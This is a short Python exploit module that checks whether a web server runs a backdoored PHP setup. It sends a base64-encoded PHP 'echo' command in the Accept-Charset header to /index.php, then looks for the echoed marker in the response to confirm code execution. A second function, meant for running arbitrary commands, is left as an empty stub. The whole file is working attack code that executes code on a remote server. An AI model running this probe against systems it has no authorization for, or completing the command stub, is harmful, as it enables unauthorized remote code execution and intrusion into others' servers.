import base64
import requests



def exp_check(url):
    payload = "echo \"Rc4\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'accept-charset': payload,
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }
    try:
        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10)
        if "Rc4" in r.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_cmd(url,cmd):
    pass
